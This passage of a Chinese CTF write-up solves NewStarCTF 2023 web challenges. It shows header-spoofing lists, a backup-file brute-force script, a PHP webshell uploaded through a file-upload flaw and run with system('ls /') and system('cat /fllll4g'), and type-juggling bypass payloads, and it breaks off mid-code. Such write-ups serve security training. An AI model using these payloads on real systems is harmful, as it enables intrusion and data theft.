src="/images/2023-10-4-Newstar-1/image-20230926134653693.png" alt="image-20230926134653693"></p><p>我们需要修改我们访问的浏览器为NewStarCTF2023:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">User-Agent:NewStarCTF2023<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926134804370.png" alt="image-20230926134804370"></p><p>告诉我们访问的源网页地址是newstarctf.com:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">Referer:newstarctf.com<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926135002273.png" alt="image-20230926135002273"></p><p>最后我们需要伪造本地用户访问,这里提供了一些用于伪造的字段:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br> <br>X-Forwarded:127.0.0.1<br> <br>Forwarded-For:127.0.0.1<br> <br>Forwarded:127.0.0.1<br> <br>X-Forwarded-Host:127.0.0.1<br> <br>X-remote-IP:127.0.0.1<br> <br>X-remote-addr:127.0.0.1<br> <br>True-Client-IP:127.0.0.1<br> <br>X-Client-IP:127.0.0.1<br> <br>Client-IP:127.0.0.1<br> <br>X-Real-IP:127.0.0.1<br> <br>Ali-CDN-Real-IP:127.0.0.1<br> <br>Cdn-Src-Ip:127.0.0.1<br> <br>Cdn-Real-Ip:127.0.0.1<br> <br>CF-Connecting-IP:127.0.0.1<br> <br>X-Cluster-Client-IP:127.0.0.1<br> <br>WL-Proxy-Client-IP:127.0.0.1<br> <br>Proxy-Client-IP:127.0.0.1<br> <br>Fastly-Client-Ip:127.0.0.1<br> <br>True-Client-Ip:127.0.0.1<br><br>Host: 127.0.0.1<br></code></pre></td></tr></table></figure><p>[XFF漏洞利用<a href="https://cloud.tencent.com/developer/article/2039293">通俗易懂]-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>payload:</p><p>这里我用了X-Real-IP:127.0.0.1用来伪造:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Real-IP:127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926135303533.png" alt="image-20230926135303533"></p><p>flag&#x3D;flag{47812204-bfe7-4821-b0a5-ca4d18f44e9f}</p><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926135548124.png" alt="image-20230926135548124"></p><p>根据网页提示存在备份文件泄露：<br>访问robots.txt:<br><img src="/images/2023-10-4-Newstar-1/image-20230926135706266.png" alt="image-20230926135706266"></p><p>获得半个flag:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag&#123;r0bots_1s_s0_us3ful<br></code></pre></td></tr></table></figure><p>先使用我们的自主脚本查找网页的后台文件(后台文件目录请私聊):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;php_bak.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.readlines()<br>    <span class="hljs-comment"># print(bak_data)</span><br><span class="hljs-comment"># 去除换行符</span><br>bak_data = []<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data:<br>    bak_data.append(d.strip(<span class="hljs-string">&#x27;\n&#x27;</span>))<br><span class="hljs-comment"># print(bak_data)</span><br>url = <span class="hljs-string">&quot;http://0a2444bb-05dd-4ecf-8cbc-6e34948c0b2a.node4.buuoj.cn:81/&quot;</span><br><br><span class="hljs-keyword">for</span> bak_d <span class="hljs-keyword">in</span> bak_data:<br>    url_final = url + bak_d<br>    r = requests.get(url_final)<br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># print(type(r.status_code))</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-number">200</span> == r.status_code):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(bak_d, r.status_code))<br><br><br><br><span class="hljs-comment"># l1 = [&#x27;web&#x27;, &#x27;website&#x27;, &#x27;backup&#x27;, &#x27;back&#x27;, &#x27;www&#x27;, &#x27;wwwroot&#x27;, &#x27;temp&#x27;]</span><br><span class="hljs-comment"># l2 = [&#x27;tar&#x27;, &#x27;tar.gz&#x27;, &#x27;zip&#x27;, &#x27;rar&#x27;]</span><br><span class="hljs-comment"># l1 = [&#x27;web&#x27;, &#x27;website&#x27;, &#x27;backup&#x27;, &#x27;back&#x27;, &#x27;www&#x27;, &#x27;wwwroot&#x27;, &#x27;temp&#x27;,&#x27;index&#x27;,&#x27;index.php&#x27;]</span><br><span class="hljs-comment"># l2 = [&#x27;tar&#x27;, &#x27;tar.gz&#x27;, &#x27;zip&#x27;, &#x27;rar&#x27;,&#x27;7z&#x27;,&#x27;php~&#x27;,&#x27;php&#x27;]</span><br><br><br><span class="hljs-comment"># for i in l1:</span><br><span class="hljs-comment">#     for j in l2:</span><br><span class="hljs-comment">#         print(i+&quot; &quot;+j)</span><br><span class="hljs-comment">#         url_final = url + &quot;/&quot; + i + &quot;.&quot; + j</span><br><span class="hljs-comment">#         r = requests.get(url_final)</span><br><span class="hljs-comment">#         print(r)</span><br><br><span class="hljs-comment"># 找到文件为正常响应:200</span><br><span class="hljs-comment"># www zip</span><br><span class="hljs-comment"># &lt;Response [200]&gt;</span><br></code></pre></td></tr></table></figure><p>输出结果:</p><p><img src="/images/2023-10-4-Newstar-1/image-20230926140025030.png" alt="image-20230926140025030"></p><p>发现存在一个<a href="http://www.zip文件，访问下载后我们在index.php中发现了后面一半flag：">www.zip文件，访问下载后我们在index.php中发现了后面一半flag：</a><br><img src="/images/2023-10-4-Newstar-1/image-20230926140146599.png" alt="image-20230926140146599"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">_4nd_www.zip_1s_s0_d4ng3rous&#125;<br></code></pre></td></tr></table></figure><p>flag&#x3D;flag{r0bots_1s_s0_us3ful_4nd_<a href="http://www.zip_1s_s0_d4ng3rous}/">www.zip_1s_s0_d4ng3rous}</a></p><h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p><img src="/images/2023-10-4-Newstar-1/image-20230926140325625.png" alt="image-20230926140325625"></p><p>我们直接上传图片木马文件,并使用BP抓包:</p><p><img src="/images/2023-10-4-Newstar-1/image-20230926140502172.png" alt="image-20230926140502172"></p><p>发现上传成功，我们修改一下图片文件的后缀名为php:<br><img src="/images/2023-10-4-Newstar-1/image-20230926140550913.png" alt="image-20230926140550913"></p><p>发现也上传成功，我们访问一下&#x2F;upload&#x2F;pass.php:<br><img src="/images/2023-10-4-Newstar-1/image-20230926140653179.png" alt="image-20230926140653179"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pass=system(&#x27;ls /&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926140727477.png" alt="image-20230926140727477"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">pass=system(&#x27;cat /fllll4g&#x27;);<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230926140810360.png" alt="image-20230926140810360"></p><h2 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h2><p>网页代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>绕过第一个if：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 1=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-comment">//获取key1和key2的值，他们的值不能相同，但是md5的值相同，可以使用数组绕过法</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>] !== <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key1&#x27;</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key2&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$flag1</span> = True;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//会强制结束php进程，所以需要绕过</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 1&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?key1[]=1&amp;key2[]=2<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927132411728.png" alt="image-20230927132411728"></p><p>绕过第二个if:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag1</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 2=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//输入的key3的值，要使它的md5值和sha1的值相同</span><br>        <span class="hljs-comment">//md5加密和sha1加密对数组的返回结果都是null</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key3&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$flag2</span> = True;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 2&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927132609158.png" alt="image-20230927132609158"></p><p>绕过第三个if：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag2</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 3=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//key4输入的值的内容和/flag中的内容进行比较，如果相同则返回0</span><br>        <span class="hljs-comment">//strcmp()如果比较的内容是一个数组，则会直接返回0</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key4&#x27;</span>],<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>)) == <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$flag3</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 3&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927133350093.png" alt="image-20230927133350093"></p><p>绕过第四个if:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag3</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 4=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]))&#123;<br>        <span class="hljs-comment">//我们需要输入一个key5的值，它的类型不能是数字，但是它的值要大于2023</span><br>        <span class="hljs-comment">//使用key5=&quot;9e9&quot;,没有绕过去</span><br>        <span class="hljs-comment">//使用key5[]=&quot;9e9&quot;,发现绕过，判断为数组类型后,由于key5现在代表的是数组，所以参与比较的是key5的地址值，地址值一般都很大</span><br>        <span class="hljs-comment">//类型判断时为数组</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key5&#x27;</span>] &gt; <span class="hljs-number">2023</span>)&#123;<br>            <span class="hljs-variable">$flag4</span> = True;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 4&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5[]=&quot;9e9&quot;<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927134811015.png" alt="image-20230927134811015"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5[]=&quot;1&quot;<br>POST:<br>key3[]=3<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927134955048.png" alt="image-20230927134955048"></p><p>绕过最后一个if:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag4</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;=Level 5=&lt;br&gt;&quot;</span>;<br>    <span class="hljs-comment">//extract()可以通过传入的同名变量值，对已有字符集进行变量值覆盖</span><br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<span class="hljs-comment">//$_POST获取post传入的所有参数值，并形成关联数组</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$var</span>)&#123;<br>        <span class="hljs-comment">//比较post传参中的所有参数的值是否存在字母和数字</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$var</span>))&#123;<br>            <span class="hljs-comment">//所以我们post传参中的所有变量的值都不能有数字和字母</span><br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//这里存在$flag5变量，说明字符集中存在$flag5变量值，可以通过extract()函数对其进行变量覆盖</span><br>    <span class="hljs-comment">//弱if判断，只要$flag5不是0或空或null,它就会判断为true,所以只需要传入一个非字母非数字的字符即可</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$flag5</span>)&#123;<br>        <span class="hljs-comment">//输出根目录flag文件的内容</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope,this is level 5&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">GET:<br>?key1[]=1&amp;key2[]=2&amp;key4[]=4&amp;key5[]=&quot;9e9&quot;<br>POST:<br>key3[]=@&amp;flag5=@<br></code></pre></td></tr></table></figure><p><img src="/images/2023-10-4-Newstar-1/image-20230927135825599.png" alt="image-20230927135825599"></p><h2 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h2><p>代码审计:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$password</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>];<br>    <span 